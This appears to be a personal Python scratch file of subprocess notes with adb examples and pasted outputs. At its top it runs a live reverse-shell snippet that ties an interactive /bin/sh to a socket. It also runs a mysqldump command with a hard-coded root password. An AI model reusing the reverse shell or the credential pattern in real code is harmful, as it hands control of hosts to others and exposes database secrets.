import netsnmp, subprocess, os
import socket, subprocess, os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("localhost", 22))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
p = subprocess.call(["/bin/sh", "-i"])


#
# def aaa():
#     with netsnmp.SNMPSession('localhost', 'public') as ss:
#         return ss.get(['.1.3.6.1.2.1.1.1.0', '.1.3.6.1.2.1.1.3.0'])
#         # [('.1.3.6.1.2.1.1.1.0', 'STRING',
#         #   '"Linux laosierLinux 4.15.0-22-generic #24-Ubuntu SMP Wed May 16 12:15:17 UTC 2018 x86_64"'),
#         #  ('.1.3.6.1.2.1.1.3.0', 'Timeticks', '0:3:13:31.57')]

os.system('pwd')
os.system('mysqldump -h localhost -uroot -pmysql  -d MOTTA_data > dump.sql')


# subprocess.run使用
def subprocess_run():
    print(1111111)
    retcode = subprocess.call(["ls", "-l"])
    print(11111)
    print(retcode)


"""结果
**** subprocess.run ****
----------
List of devices attached
338b123f0504    device

result1: CompletedProcess(args=['adb', 'devices'], returncode=0)
----------
List of devices attached
338b123f0504    device

result2: CompletedProcess(args='adb devices', returncode=0)
----------
result3: CompletedProcess(args=['adb', 'devices'], returncode=0, stdout=b'List of devices attached \r\n338b123f0504\tdevice\r\n\r\n')
<class 'subprocess.CompletedProcess'>
"""

# subprocess.call使用
# def subprocess_call():
#     print("**** subprocess.call ****")
#     print("----------")
#     result1 = subprocess.call(["adb", "devices"])
#     print("result1:", result1)
#     print("----------")
#     result2 = subprocess.call(["adb", "devices"], stdout=subprocess.PIPE)
#     print("result2:", result2)
#
#
# subprocess_call()
"""结果
**** subprocess.call ****
----------
List of devices attached
338b123f0504    device

result1: 0
----------
result2: 0
"""

# subprocess.check_call
# def subprocess_check_call():
#     print("**** subprocess.check_call ****")
#     print("----------")
#     result1 = subprocess.check_call(["adb", "devices"])
#     print("result1:", result1)
#     print("----------")
#     result2 = subprocess.check_call(["adb", "devices"], stdout=subprocess.PIPE)
#     print("result2:", result2)
#
#
# subprocess_check_call()
"""结果
**** subprocess.check_call ****
----------
List of devices attached
338b123f0504    device

result1: 0
----------
result2: 0
"""

# subprocess.check_output
# def subprocess_check_output():
#     print("**** subprocess.check_output ****")
#     print("----------")
#     result1 = subprocess.check_output(["adb", "devices"])
#     print("result1:", result1)
#     print("----------")
#     result2 = subprocess.run(["adb", "devices"], stdout=subprocess.PIPE).stdout
#     print("result2:", result2)
#
#
# subprocess_check_output()
"""结果
**** subprocess.check_output ****
----------
result1: b'List of devices attached \r\n338b123f0504\tdevice\r\n\r\n'
----------
result2: b'List of devices attached \r\n338b123f0504\tdevice\r\n\r\n'
"""
